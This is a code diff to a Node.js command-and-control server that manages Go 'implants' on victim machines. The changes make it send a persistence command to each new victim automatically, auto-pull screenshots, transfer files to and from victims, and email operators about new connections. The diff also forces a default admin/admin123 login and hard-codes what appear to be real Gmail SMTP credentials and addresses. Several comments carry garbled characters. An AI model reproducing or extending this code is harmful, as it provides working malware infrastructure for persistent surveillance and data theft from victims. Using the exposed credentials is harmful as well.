@@ -1,4 +1,4 @@
-// override: true — PM2 often sets TCP_PORT=80 in ecosystem; .env TCP_PORT=443 must win for Go clients.
+﻿// override: true ÔÇö PM2 often sets TCP_PORT=80 in ecosystem; .env TCP_PORT=2026 must win for Go clients.
 require('dotenv').config({ override: true });
 const express = require('express');
 const http = require('http');
@@ -23,62 +23,22 @@ const allowedOrigins = (process.env.CORS_ORIGIN || "http://localhost:5000")
   .map(s => s.trim())
   .filter(Boolean);
 
-/** Large GUI uploads send base64 in one Socket.IO packet; default ~1 MiB limit drops the connection. */
-const SOCKET_MAX_HTTP_BUFFER = Math.max(
-  128 * 1024 * 1024,
-  Number(process.env.SOCKET_MAX_HTTP_BUFFER_BYTES) || 0
-);
-
 const io = socketIo(server, {
   cors: {
     origin: allowedOrigins.length ? allowedOrigins : '*',
     methods: ["GET", "POST"],
     credentials: true
   },
-  maxHttpBufferSize: SOCKET_MAX_HTTP_BUFFER
+  // Default is ~1 MiB ÔÇö EXE uploads sent as base64 easily exceed that and fail silently
+  maxHttpBufferSize: 128 * 1024 * 1024,
+  pingTimeout: 120000,
+  pingInterval: 25000
 });
-
-/**
- * Write one chunk to the implant TCP socket. Uses write() callback so we never
- * double-send when the return value is false (data is already queued internally;
- * re-calling write() on 'drain' would duplicate bytes and corrupt the file).
- */
-function writeTcpChunkRespectingDrain(tcpSocket, chunk) {
-  return new Promise((resolve, reject) => {
-    if (tcpSocket.destroyed) {
-      reject(new Error('TCP socket closed'));
-      return;
-    }
-    try {
-      tcpSocket.write(chunk, (err) => {
-        if (err) reject(err);
-        else resolve();
-      });
-    } catch (e) {
-      reject(e);
-    }
-  });
-}
-
-async function streamBinaryUploadToImplant(tcpSocket, fileBuffer, onProgress) {
-  const total = fileBuffer.length;
-  const sizeBuf = Buffer.allocUnsafe(8);
-  sizeBuf.writeBigUInt64LE(BigInt(total), 0);
-  await writeTcpChunkRespectingDrain(tcpSocket, sizeBuf);
-  if (typeof onProgress === 'function') onProgress(0, total);
-  const CHUNK = 256 * 1024;
-  let sent = 0;
-  while (sent < total) {
-    const end = Math.min(sent + CHUNK, total);
-    await writeTcpChunkRespectingDrain(tcpSocket, fileBuffer.subarray(sent, end));
-    sent = end;
-    if (typeof onProgress === 'function') onProgress(sent, total);
-  }
-}
 
 // Middleware
 app.use(cors());
-app.use(express.json());
+app.use(express.json({ limit: '128mb' }));
+app.use(express.urlencoded({ extended: true, limit: '128mb' }));
 app.use(express.static('client/build'));
 
 // File upload configuration
@@ -446,7 +406,20 @@ async function loadDb() {
 function ensureDatabaseSchema() {
   if (!db) return;
   db.run(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);`);
-  db.run(`CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, passwordHash TEXT NOT NULL, role TEXT NOT NULL DEFAULT 'admin');`);
+  db.run(`CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, passwordHash TEXT NOT NULL, role TEXT NOT NULL DEFAULT 'admin', email TEXT DEFAULT '');`);
+  // Migrate older DBs that lack email column
+  try {
+    const cols = [];
+    const info = db.exec('PRAGMA table_info(users)');
+    if (info[0] && info[0].values) {
+      info[0].values.forEach((row) => cols.push(row[1]));
+    }
+    if (!cols.includes('email')) {
+      db.run(`ALTER TABLE users ADD COLUMN email TEXT DEFAULT ''`);
+    }
+  } catch (e) {
+    try { db.run(`ALTER TABLE users ADD COLUMN email TEXT DEFAULT ''`); } catch (_) { /* already exists */ }
+  }
   db.run(`CREATE TABLE IF NOT EXISTS clients (
       id TEXT PRIMARY KEY,
       hostname TEXT NOT NULL,
@@ -512,7 +485,7 @@ function persistDb() {
 }
 
 const defaultSettings = {
-  serverPort: 443,
+  serverPort: 2026,
   serverHost: '0.0.0.0',
   maxClients: 100,
   heartbeatInterval: 60,
@@ -530,7 +503,7 @@ const defaultSettings = {
   emailPass: 'xabadhtihzjnitxx',
   emailFrom: 'fahis00786@gmail.com',
   emailTo: ['zararanwar1234321@gmail.com','qaziwaseem4zetabytes@gmail.com'],
-  emailSubject: 'Fahis Connection Alert'
+  emailSubject: '!0 Connection Alert'
 };
 
 function getAllSettings() {
@@ -589,6 +562,72 @@ function ensureDefaultSettings() {
   if (Object.keys(missing).length > 0) setSettings(missing);
 }
 
+function ensureDefaultUser() {
+  // Always ensure default admin exists with known password
+  const passwordHash = bcrypt.hashSync('admin123', 10);
+  const existing = getUser('admin');
+  if (!existing) {
+    const insertStmt = db.prepare('INSERT INTO users (username, passwordHash, role, email) VALUES (?, ?, ?, ?)');
+    insertStmt.run(['admin', passwordHash, 'admin', '']);
+    insertStmt.free();
+    console.log('[DB] Default admin user created (admin/admin123)');
+  } else {
+    const updateStmt = db.prepare('UPDATE users SET passwordHash = ?, role = ? WHERE username = ?');
+    updateStmt.run([passwordHash, 'admin', 'admin']);
+    updateStmt.free();
+    console.log('[DB] Default admin password reset (admin/admin123)');
+  }
+  persistDb();
+}
+
+// Server-side OTP store (username -> { code, expires, passwordVerified })
+const pendingOtps = new Map();
+const isProduction = process.env.NODE_ENV === 'production';
+
+function maskEmail(email) {
+  const e = String(email || '').trim();
+  const at = e.indexOf('@');
+  if (at < 1) return '***';
+  const user = e.slice(0, at);
+  const domain = e.slice(at);
+  const visible = user.slice(0, Math.min(2, user.length));
+  return `${visible}${'*'.repeat(Math.max(3, user.length - visible.length))}${domain}`;
+}
+
+function isValidEmail(email) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email || '').trim());
+}
+
+async function sendOtpEmail(toEmail, code, username) {
+  const settings = getAllSettings();
+  if (!settings.emailEnabled || !settings.emailUser || !settings.emailPass) {
+    throw new Error('Email SMTP is not configured');
+  }
+  if (!emailTransporter) {
+    emailTransporter = createEmailTransporter();
+  }
+  if (!emailTransporter) {
+    throw new Error('Email transporter unavailable');
+  }
+
+  const mailOptions = {
+    from: settings.emailFrom || settings.emailUser,
+    to: toEmail,
+    subject: '!0 Login OTP',
+    html: `
+      <h2>!0 Login Verification</h2>
+      <p>Hello <strong>${username}</strong>,</p>
+      <p>Your one-time password (OTP) is:</p>
+      <p style="font-size:28px;font-weight:700;letter-spacing:6px;">${code}</p>
+      <p>This code expires in 5 minutes. If you did not request this, ignore this email.</p>
+    `
+  };
+
+  const info = await emailTransporter.sendMail(mailOptions);
+  console.log(`[EMAIL] OTP sent to ${maskEmail(toEmail)}: ${info.messageId}`);
+  return true;
+}
+
 // Email functionality
 let emailTransporter = null;
 
@@ -632,8 +671,8 @@ async function sendConnectionAlert(clientInfo) {
   }
 
   const emailContent = `
-    <h2>🚨 Fahis Connection Alert</h2>
-    <p>A new client has connected to your C2 server.</p>
+    <h2>!0 Connection Alert</h2>
+    <p>A new client has connected to your !0 server.</p>
     
     <h3>Client Details:</h3>
     <ul>
@@ -683,6 +722,7 @@ async function sendConnectionAlert(clientInfo) {
 (async () => {
   await loadDb();
   ensureDefaultSettings();
+  ensureDefaultUser();
 })();
 
 // ============================================================
@@ -731,7 +771,7 @@ function getOrganizedFilePath(clientId, client, filename) {
   return path.join(clientDir, safeFilename);
 }
 
-/** If buffer is a ZIP (PK…) and basename is not already a zip-based type, use .zip so folder archives save correctly. */
+/** If buffer is a ZIP (PKÔÇª) and basename is not already a zip-based type, use .zip so folder archives save correctly. */
 function physicalDownloadBasename(remotePath, buffer) {
   const base = path.basename(remotePath || `download_${Date.now()}`);
   if (!Buffer.isBuffer(buffer) || buffer.length < 4) return base;
@@ -750,9 +790,43 @@ function logTcpDownloadProgress(pd) {
   if (mb < 1) return;
   if (pd._progressNextMb == null) pd._progressNextMb = 5;
   while (mb >= pd._progressNextMb) {
-    console.log(`[TCP] Download progress: ~${pd._progressNextMb} MiB — ${path.basename(pd.filename || 'file')}`);
+    console.log(`[TCP] Download progress: ~${pd._progressNextMb} MiB ÔÇö ${path.basename(pd.filename || 'file')}`);
     pd._progressNextMb += 5;
   }
+}
+
+function emitSavedDownload(clientId, saveName, downloadPath, fileBuf, isScreenshot) {
+  const buf = fileBuf || Buffer.alloc(0);
+  const clientDir = path.basename(path.dirname(downloadPath));
+  const shot =
+    !!isScreenshot ||
+    /^snapshot_/i.test(saveName) ||
+    /^screenshot_/i.test(saveName) ||
+    /\.(bmp|png|jpe?g)$/i.test(saveName);
+  io.emit('fileDownloaded', {
+    clientId,
+    filename: saveName,
+    path: downloadPath,
+    clientDir,
+    size: buf.length,
+    isScreenshot: shot
+  });
+  if (shot && buf.length > 0 && buf.length < 25 * 1024 * 1024) {
+    io.emit('screenshotReady', {
+      clientId,
+      filename: saveName,
+      path: downloadPath,
+      clientDir,
+      size: buf.length,
+      mime: /\.png$/i.test(saveName) ? 'image/png' : /\.jpe?g$/i.test(saveName) ? 'image/jpeg' : 'image/bmp',
+      dataBase64: buf.toString('base64')
+    });
+  }
+  io.emit('commandResponse', {
+    clientId,
+    response: `Download complete -> ${downloadPath}`,
+    timestamp: new Date()
+  });
 }
 
 // ============================================================
@@ -978,11 +1052,10 @@ function createTcpServer() {
             const saveName = physicalDownloadBasename(pd.filename || `download_${Date.now()}`, pd.buffer || Buffer.alloc(0));
             const client = clients.get(clientId);
             const downloadPath = getOrganizedFilePath(clientId, client, saveName);
-            fs.writeFileSync(downloadPath, pd.buffer || Buffer.alloc(0));
-            console.log(`[TCP] File downloaded: ${downloadPath} (${(pd.buffer||Buffer.alloc(0)).length} bytes)`);
-            io.emit('fileDownloaded', { clientId, filename: saveName, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
-            // Also emit a terminal-friendly message
-            io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}`, timestamp: new Date() });
+            const fileBuf = pd.buffer || Buffer.alloc(0);
+            fs.writeFileSync(downloadPath, fileBuf);
+            console.log(`[TCP] File downloaded: ${downloadPath} (${fileBuf.length} bytes)`);
+            emitSavedDownload(clientId, saveName, downloadPath, fileBuf, pd.isScreenshot);
             
             // Only parse ZIP / .lnk for follow-on downloads when explicitly requested (pendingDownload.resolveShortcuts).
             if (pd.resolveShortcuts && saveName.toLowerCase().endsWith('.zip')) {
@@ -1031,10 +1104,10 @@ function createTcpServer() {
               const saveName = physicalDownloadBasename(pd.filename || `download_${Date.now()}`, pd.buffer || Buffer.alloc(0));
               const client = clients.get(clientId);
               const downloadPath = getOrganizedFilePath(clientId, client, saveName);
-              fs.writeFileSync(downloadPath, pd.buffer || Buffer.alloc(0));
-              console.log(`[TCP] File downloaded (text-split path): ${downloadPath} (${(pd.buffer||Buffer.alloc(0)).length} bytes)`);
-              io.emit('fileDownloaded', { clientId, filename: saveName, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
-              io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}`, timestamp: new Date() });
+              const fileBuf = pd.buffer || Buffer.alloc(0);
+              fs.writeFileSync(downloadPath, fileBuf);
+              console.log(`[TCP] File downloaded (text-split path): ${downloadPath} (${fileBuf.length} bytes)`);
+              emitSavedDownload(clientId, saveName, downloadPath, fileBuf, pd.isScreenshot);
               
               if (pd.resolveShortcuts && saveName.toLowerCase().endsWith('.zip')) {
                 console.log('[SHORTCUT] ZIP file downloaded, processing shortcuts...');
@@ -1066,7 +1139,8 @@ function createTcpServer() {
             content: raw.content || raw.Content,
             hostname: raw.hostname || raw.Hostname,
             macAddress: raw.macAddress || raw.MACAddress,
-            username: raw.username || raw.Username
+            username: raw.username || raw.Username,
+            os: raw.os || raw.OS || raw.Os
           };
           
           // Process the message
@@ -1078,13 +1152,14 @@ function createTcpServer() {
           hostname: message.hostname,
           macAddress: message.macAddress,
           username: message.username,
-          os: message.os || 'Unknown',
+          os: (message.os && String(message.os).toLowerCase() !== 'unknown')
+            ? String(message.os).toLowerCase()
+            : 'windows',
           socket: socket,
           connectedAt: new Date(),
           lastSeen: new Date(),
           active: true,
-          sessionId: uuidv4(),
-          tcpUploadInProgress: false
+          sessionId: uuidv4()
         };
         
         clients.set(clientId, clientInfo);
@@ -1095,6 +1170,26 @@ function createTcpServer() {
         createClientSession(clientId, clientInfo.sessionId, clientIP);
         
         console.log(`[TCP] Client registered: ${clientInfo.hostname} (${clientInfo.username})`);
+
+        // Default on connect: set persistence (after brief handshake settle)
+        setTimeout(() => {
+          const live = clients.get(clientId);
+          if (!live || !live.socket || !live.active) return;
+          try {
+            live.socket.write(JSON.stringify({ type: 'command', content: 'setpersistence' }) + '\n');
+            const session = clientSessions.get(clientId) || [];
+            session.push({ timestamp: new Date(), type: 'command', content: 'setpersistence' });
+            clientSessions.set(clientId, session);
+            io.emit('commandSent', {
+              clientId,
+              command: 'setpersistence',
+              timestamp: new Date()
+            });
+            console.log(`[TCP] Auto command setpersistence -> ${clientInfo.hostname}`);
+          } catch (e) {
+            console.error('[TCP] Auto setpersistence failed:', e.message);
+          }
+        }, 800);
         
         // Send email notification
         sendConnectionAlert(clientInfo).catch(err => {
@@ -1108,6 +1203,7 @@ function createTcpServer() {
           username: clientInfo.username,
           macAddress: clientInfo.macAddress,
           ip: clientInfo.ip,
+          os: clientInfo.os,
           connectedAt: clientInfo.connectedAt
         });
 
@@ -1118,6 +1214,7 @@ function createTcpServer() {
           username: c.username,
           macAddress: c.macAddress,
           ip: c.ip,
+          os: c.os,
           connectedAt: c.connectedAt,
           lastSeen: c.lastSeen,
           active: c.active
@@ -1141,6 +1238,31 @@ function createTcpServer() {
             ? String(message.content).trim()
             : '';
 
+          // Auto-pull screenshot BMP from implant to server after capture
+          const snapMatch = respTrim.match(/Snapshot saved as:\s*(.+)$/i);
+          if (snapMatch && !client.pendingDownload) {
+            const remotePath = snapMatch[1].trim();
+            client.pendingDownload = {
+              inProgress: true,
+              filename: remotePath,
+              buffer: Buffer.alloc(0),
+              timeout: null,
+              isScreenshot: true
+            };
+            try {
+              client.socket.write(JSON.stringify({ type: 'command', content: `download ${remotePath}` }) + '\n');
+              io.emit('commandSent', {
+                clientId,
+                command: `download ${remotePath} (auto screenshot pull)`,
+                timestamp: new Date()
+              });
+              console.log(`[TCP] Auto-pulling screenshot: ${remotePath}`);
+            } catch (e) {
+              client.pendingDownload = null;
+              console.error('[TCP] Screenshot auto-pull failed:', e.message);
+            }
+          }
+
           // Implant is ready to receive raw bytes: 8-byte LE size + file body
           if (client.pendingUpload && respTrim === 'ready') {
             if (client.pendingUploadTimeout) {
@@ -1149,46 +1271,63 @@ function createTcpServer() {
             }
             const pu = client.pendingUpload;
             client.pendingUpload = null;
-            const requester = pu.requesterSocket;
-            client.tcpUploadInProgress = true;
-            const pushUploadResult = (okMsg, isError) => {
-              const session = clientSessions.get(clientId) || [];
-              session.push({ timestamp: new Date(), type: 'response', content: okMsg });
-              clientSessions.set(clientId, session);
-              io.emit('commandResponse', { clientId, response: okMsg, timestamp: new Date() });
-              if (requester && requester.connected) {
-                requester.emit('uploadProgress', {
-                  clientId,
-                  remotePath: pu.remotePath,
-                  sent: isError ? 0 : pu.buffer.length,
-                  total: pu.buffer.length,
-                  done: true,
-                  error: isError ? okMsg : undefined
-                });
-              }
-            };
-            streamBinaryUploadToImplant(client.socket, pu.buffer, (sent, total) => {
-              if (requester && requester.connected) {
-                requester.emit('uploadProgress', {
-                  clientId,
-                  remotePath: pu.remotePath,
-                  sent,
-                  total,
-                  done: false
-                });
-              }
-            })
-              .then(() => {
-                const okMsg = `Upload complete (${pu.buffer.length} bytes) -> ${pu.remotePath}`;
-                pushUploadResult(okMsg, false);
-              })
-              .catch((e) => {
-                const errMsg = `Upload failed: ${e.message}`;
-                pushUploadResult(errMsg, true);
-              })
-              .finally(() => {
-                client.tcpUploadInProgress = false;
+            const emitUploadProgress = (sent, total, phase) => {
+              const percent = total > 0 ? Math.min(100, Math.round((sent / total) * 100)) : 0;
+              io.emit('uploadProgress', {
+                clientId,
+                remotePath: pu.remotePath,
+                sent,
+                total,
+                percent,
+                phase: phase || 'transfer'
               });
+            };
+            const writeChunk = (sock, chunk) => new Promise((resolve, reject) => {
+              sock.write(chunk, (err) => (err ? reject(err) : resolve()));
+            });
+            (async () => {
+              try {
+                const total = pu.buffer.length;
+                emitUploadProgress(0, total, 'transfer');
+                const sizeBuf = Buffer.allocUnsafe(8);
+                sizeBuf.writeBigUInt64LE(BigInt(total), 0);
+                await writeChunk(client.socket, sizeBuf);
+                const chunkSize = 64 * 1024;
+                let sent = 0;
+                let lastPct = -1;
+                for (let offset = 0; offset < total; offset += chunkSize) {
+                  const end = Math.min(offset + chunkSize, total);
+                  await writeChunk(client.socket, pu.buffer.subarray(offset, end));
+                  sent = end;
+                  const pct = total > 0 ? Math.round((sent / total) * 100) : 100;
+                  if (pct !== lastPct || sent === total) {
+                    lastPct = pct;
+                    emitUploadProgress(sent, total, 'transfer');
+                  }
+                }
+                emitUploadProgress(total, total, 'done');
+                const okMsg = `Upload complete (${total} bytes) -> ${pu.remotePath}`;
+                const session = clientSessions.get(clientId) || [];
+                session.push({ timestamp: new Date(), type: 'response', content: okMsg });
+                clientSessions.set(clientId, session);
+                io.emit('commandResponse', { clientId, response: okMsg, timestamp: new Date() });
+              } catch (e) {
+                io.emit('uploadProgress', {
+                  clientId,
+                  remotePath: pu.remotePath,
+                  sent: 0,
+                  total: pu.buffer.length,
+                  percent: 0,
+                  phase: 'error',
+                  error: e.message
+                });
+                const errMsg = `Upload failed: ${e.message}`;
+                const session = clientSessions.get(clientId) || [];
+                session.push({ timestamp: new Date(), type: 'response', content: errMsg });
+                clientSessions.set(clientId, session);
+                io.emit('commandResponse', { clientId, response: errMsg, timestamp: new Date() });
+              }
+            })();
             continue;
           }
 
@@ -1258,8 +1397,8 @@ function createTcpServer() {
         if (buf.length > 0) {
           fs.writeFileSync(downloadPath, buf);
           console.log(`[TCP] File downloaded (on close): ${downloadPath} (${buf.length} bytes)`);
-          io.emit('fileDownloaded', { clientId, filename: saveName, path: downloadPath, size: buf.length });
-          io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}` , timestamp: new Date() });
+          const wasShot = !!(client.pendingDownload && client.pendingDownload.isScreenshot);
+          emitSavedDownload(clientId, saveName, downloadPath, buf, wasShot);
           
           if (resolveShortcuts && saveName.toLowerCase().endsWith('.zip')) {
             console.log('[SHORTCUT] ZIP file downloaded, processing shortcuts...');
@@ -1302,22 +1441,28 @@ function createTcpServer() {
 function normalizeTcpListenPort(raw) {
   const n = Number(raw);
   if (Number.isFinite(n) && n > 0 && n < 65536) return Math.floor(n);
-  console.warn('[TCP] Invalid TCP port', raw, '- using 443');
-  return 443;
+  console.warn('[TCP] Invalid TCP port', raw, '- using 2026');
+  return 2026;
 }
 
 /**
  * Implant TCP must not share the HTTP server port. If they match (e.g. .env TCP_PORT=5000 with PORT=5000),
- * use 443 — the default expected by lastfinalversion2.go.
+ * use 2026 ÔÇö the default expected by lastfinalversion2.go.
+ * Ports 80/443 see HTTP/TLS probes ÔåÆ JSON parse errors in logs; warn only.
  */
 function resolveImplantTcpPort(rawTcpPort, rawHttpPort) {
   const httpP = normalizeTcpListenPort(rawHttpPort);
   let tcpP = normalizeTcpListenPort(rawTcpPort);
   if (tcpP === httpP) {
     console.warn(
-      `[TCP] TCP_PORT (${tcpP}) cannot equal HTTP PORT (${httpP}). Using 443 for Go implant TCP. Fix .env: TCP_PORT=443`
+      `[TCP] TCP_PORT (${tcpP}) cannot equal HTTP PORT (${httpP}). Using 2026 for Go implant TCP. Fix .env: TCP_PORT=2026`
     );
-    tcpP = 443;
+    tcpP = 2026;
+  }
+  if (tcpP === 80 || tcpP === 443) {
+    console.warn(
+      `[TCP] Listening on ${tcpP} will get HTTP/TLS scanners (JSON parse errors). Prefer TCP_PORT=2026 for implants.`
+    );
   }
   return tcpP;
 }
@@ -1376,7 +1521,7 @@ async function restartTcpServerIfNeeded(newHost, newPort) {
     const s = getAllSettings();
     const tcpHost = process.env.TCP_HOST || s.serverHost || '0.0.0.0';
     const httpPort = Number(process.env.PORT || 5000);
-    const tcpPort = resolveImplantTcpPort(process.env.TCP_PORT || s.serverPort || 443, httpPort);
+    const tcpPort = resolveImplantTcpPort(process.env.TCP_PORT || s.serverPort || 2026, httpPort);
     try {
       await startTcpServer(tcpHost, tcpPort);
     } catch (e) {
@@ -1397,7 +1542,7 @@ async function restartTcpServerIfNeeded(newHost, newPort) {
 
 // ---- Auth helpers ----
 function getUser(username) {
-  const stmt = db.prepare('SELECT username, passwordHash, role FROM users WHERE username = ?');
+  const stmt = db.prepare('SELECT username, passwordHash, role, email FROM users WHERE username = ?');
   stmt.bind([username]);
   if (!stmt.step()) {
     stmt.free();
@@ -1422,13 +1567,120 @@ function requireAuth(req, res, next) {
   }
 }
 
-// Public login endpoint
+// Credential verification endpoint (for OTP flow) ÔÇö issues OTP and emails it in production
+app.post('/api/verify-credentials', async (req, res) => {
+  await syncDatabaseFromDisk();
+  const body = req.body || {};
+  const username = body.username || '';
+  const password = body.password || '';
+  
+  if (!username || !password) {
+    return res.status(400).json({ error: 'Username and password required' });
+  }
+  
+  const user = getUser(username);
+  if (!user) {
+    return res.status(401).json({ valid: false, error: 'Invalid credentials' });
+  }
+  
+  const ok = bcrypt.compareSync(password, user.passwordHash);
+  if (!ok) {
+    return res.status(401).json({ valid: false, error: 'Invalid credentials' });
+  }
+
+  const code = String(Math.floor(100000 + Math.random() * 900000));
+  pendingOtps.set(username, {
+    code,
+    expires: Date.now() + 5 * 60 * 1000,
+    passwordHash: user.passwordHash
+  });
+
+  const userEmail = String(user.email || '').trim();
+  let otpEmailed = false;
+
+  if (isProduction) {
+    if (!isValidEmail(userEmail)) {
+      pendingOtps.delete(username);
+      return res.status(400).json({
+        valid: false,
+        error: 'No Gmail/email set for this account. Ask an admin to add it in User Management.'
+      });
+    }
+    try {
+      await sendOtpEmail(userEmail, code, username);
+      otpEmailed = true;
+    } catch (err) {
+      console.error('[EMAIL] OTP send failed:', err.message);
+      pendingOtps.delete(username);
+      return res.status(500).json({ valid: false, error: 'Failed to send OTP email. Try again later.' });
+    }
+  } else if (isValidEmail(userEmail)) {
+    try {
+      await sendOtpEmail(userEmail, code, username);
+      otpEmailed = true;
+    } catch (err) {
+      console.warn('[EMAIL] OTP email skipped (dev):', err.message);
+    }
+  }
+
+  const payload = {
+    valid: true,
+    message: otpEmailed ? 'OTP sent to your email' : 'Credentials verified',
+    otpEmailed,
+    maskedEmail: isValidEmail(userEmail) ? maskEmail(userEmail) : null
+  };
+  // Demo/local only: surface OTP in UI (never in production)
+  if (!isProduction) {
+    payload.demoOtp = code;
+  }
+  res.json(payload);
+});
+
+// Verify OTP then issue JWT
+app.post('/api/verify-otp', async (req, res) => {
+  await syncDatabaseFromDisk();
+  const body = req.body || {};
+  const username = body.username || '';
+  const password = body.password || '';
+  const otp = String(body.otp || '').trim();
+
+  if (!username || !password || !otp) {
+    return res.status(400).json({ error: 'Username, password, and OTP required' });
+  }
+
+  const user = getUser(username);
+  if (!user) {
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+  if (!bcrypt.compareSync(password, user.passwordHash)) {
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+
+  const pending = pendingOtps.get(username);
+  if (!pending || Date.now() > pending.expires) {
+    pendingOtps.delete(username);
+    return res.status(401).json({ error: 'OTP expired. Please login again.' });
+  }
+  if (otp !== pending.code) {
+    return res.status(401).json({ error: 'Invalid OTP code' });
+  }
+
+  pendingOtps.delete(username);
+  const token = jwt.sign({ sub: user.username, role: user.role }, JWT_SECRET, { expiresIn: '12h' });
+  res.json({ token });
+});
+
+// Public login endpoint (direct ÔÇö prefer OTP flow via verify-credentials + verify-otp)
 app.post('/api/login', async (req, res) => {
   await syncDatabaseFromDisk();
   const body = req.body || {};
   const username = body.username || '';
   const password = body.password || '';
   if (!username || !password) return res.status(400).json({ error: 'username and password required' });
+  // In production, require OTP flow instead of password-only login
+  if (isProduction) {
+    return res.status(403).json({ error: 'OTP verification required. Use the login form.' });
+  }
   const user = getUser(username);
   if (!user) return res.status(401).json({ error: 'Invalid credentials' });
   const ok = bcrypt.compareSync(password, user.passwordHash);
@@ -1439,7 +1691,8 @@ app.post('/api/login', async (req, res) => {
 
 // Protect API routes after this middleware
 app.use((req, res, next) => {
-  if (req.path.startsWith('/api/') && req.path !== '/api/login') {
+  const publicPaths = ['/api/login', '/api/verify-credentials', '/api/verify-otp'];
+  if (req.path.startsWith('/api/') && !publicPaths.includes(req.path)) {
     return requireAuth(req, res, next);
   }
   return next();
@@ -1476,32 +1729,29 @@ io.on('connection', (socket) => {
   console.log('[WebSocket] GUI client connected');
   
   // Send current clients list
-  const clientsList = Array.from(clients.values()).map(client => ({
-    id: client.id,
-    hostname: client.hostname,
-    username: client.username,
-    macAddress: client.macAddress,
-    ip: client.ip,
-    connectedAt: client.connectedAt,
-    lastSeen: client.lastSeen,
-    active: client.active
-  }));
-  
-  socket.emit('clientsList', clientsList);
-  
-  // Provide clients list on demand
-  socket.on('getClients', () => {
-    const list = Array.from(clients.values()).map(client => ({
+  const mapClientForGui = (client) => {
+    const osRaw = String(client.os || '').toLowerCase();
+    const os = (!osRaw || osRaw === 'unknown') ? 'windows' : osRaw;
+    return {
       id: client.id,
       hostname: client.hostname,
       username: client.username,
       macAddress: client.macAddress,
       ip: client.ip,
+      os,
       connectedAt: client.connectedAt,
       lastSeen: client.lastSeen,
       active: client.active
-    }));
-    socket.emit('clientsList', list);
+    };
+  };
+
+  const clientsList = Array.from(clients.values()).map(mapClientForGui);
+  
+  socket.emit('clientsList', clientsList);
+  
+  // Provide clients list on demand
+  socket.on('getClients', () => {
+    socket.emit('clientsList', Array.from(clients.values()).map(mapClientForGui));
   });
   
   // Handle command execution
@@ -1511,12 +1761,6 @@ io.on('connection', (socket) => {
     
     if (client && client.socket && client.active) {
       try {
-        if (client.tcpUploadInProgress) {
-          socket.emit('commandError', {
-            error: 'Binary upload to this client is in progress. Wait until it finishes before sending commands.'
-          });
-          return;
-        }
         // Handle special shortcut resolution command
         if (typeof command === 'string' && command.trim().toLowerCase() === 'resolveshortcuts') {
           io.emit('commandResponse', { 
@@ -1673,7 +1917,7 @@ io.on('connection', (socket) => {
     }
   });
   
-  // Handle file upload (path only — legacy; binary must follow on same TCP session)
+  // Handle file upload (path only ÔÇö legacy; binary must follow on same TCP session)
   socket.on('uploadFile', (data) => {
     const { clientId, filename } = data;
     const client = clients.get(clientId);
@@ -1701,27 +1945,19 @@ io.on('connection', (socket) => {
       if (!client || !client.socket || !client.active) {
         return socket.emit('uploadError', { clientId, error: 'Client not found or offline' });
       }
-      if (client.pendingUpload || client.tcpUploadInProgress) {
+      if (client.pendingUpload) {
         return socket.emit('uploadError', { clientId, error: 'Another upload is already in progress' });
       }
       if (!remotePath || !fileBase64) {
         return socket.emit('uploadError', { clientId, error: 'remotePath and fileBase64 required' });
       }
-      // Base64 expands ~4/3; packet must stay under Engine.IO maxHttpBufferSize.
-      const maxBytes = Math.min(
-        512 * 1024 * 1024,
-        Math.max(1, Math.floor((SOCKET_MAX_HTTP_BUFFER * 3) / 4) - 65536)
-      );
+      const maxBytes = 80 * 1024 * 1024;
       const buf = Buffer.from(String(fileBase64), 'base64');
       if (buf.length > maxBytes) {
-        return socket.emit('uploadError', { clientId, error: `File too large (max ${Math.floor(maxBytes / (1024 * 1024))} MiB)` });
+        return socket.emit('uploadError', { clientId, error: `File too large (max ${maxBytes / (1024 * 1024)} MiB)` });
       }
       const dest = String(remotePath).trim();
-      const uploadWaitMs = Math.min(
-        900000,
-        Math.max(120000, 120000 + Math.floor(buf.length / (256 * 1024)) * 30000)
-      );
-      client.pendingUpload = { buffer: buf, remotePath: dest, requesterSocket: socket };
+      client.pendingUpload = { buffer: buf, remotePath: dest };
       client.pendingUploadTimeout = setTimeout(() => {
         if (client.pendingUpload) {
           client.pendingUpload = null;
@@ -1732,7 +1968,7 @@ io.on('connection', (socket) => {
           });
         }
         client.pendingUploadTimeout = null;
-      }, uploadWaitMs);
+      }, 120000);
 
       const commandData = { type: 'command', content: `upload ${dest}` };
       client.socket.write(JSON.stringify(commandData) + '\n');
@@ -1743,6 +1979,14 @@ io.on('connection', (socket) => {
         timestamp: new Date()
       });
       socket.emit('uploadQueued', { clientId, remotePath: dest, size: buf.length });
+      io.emit('uploadProgress', {
+        clientId,
+        remotePath: dest,
+        sent: 0,
+        total: buf.length,
+        percent: 0,
+        phase: 'waiting'
+      });
     } catch (error) {
       console.error('[UPLOAD] uploadBinaryToClient:', error);
       socket.emit('uploadError', { clientId: data && data.clientId, error: error.message });
@@ -1788,19 +2032,29 @@ io.on('connection', (socket) => {
     socket.emit('commandHistory', commandHistory);
   });
   
-  // Delete a disconnected client from memory
+  // Delete a session (offline preferred; active sessions are force-disconnected first)
   socket.on('deleteClient', (data) => {
     try {
       const clientId = typeof data === 'string' ? data : (data && data.clientId);
       if (!clientId) return socket.emit('clientDeleteError', { error: 'clientId required' });
       const client = clients.get(clientId);
-      if (!client) return socket.emit('clientDeleteError', { error: 'Client not found' });
-      if (client.active) return socket.emit('clientDeleteError', { error: 'Cannot delete active client' });
-      // Clean up maps
-      clients.delete(clientId);
-      clientSessions.delete(clientId);
-      // Notify all GUI clients
+      if (client) {
+        if (client.active && client.socket) {
+          try { client.socket.destroy(); } catch (e) {}
+        }
+        clients.delete(clientId);
+        clientSessions.delete(clientId);
+      }
+      try {
+        if (db) {
+          db.run(`DELETE FROM clients WHERE id = '${String(clientId).replace(/'/g, "''")}'`);
+          persistDb();
+        }
+      } catch (dbErr) {
+        console.error('[DB] delete client failed:', dbErr.message);
+      }
       io.emit('clientRemoved', { id: clientId });
+      socket.emit('clientDeleted', { id: clientId });
     } catch (e) {
       socket.emit('clientDeleteError', { error: e.message || 'Delete failed' });
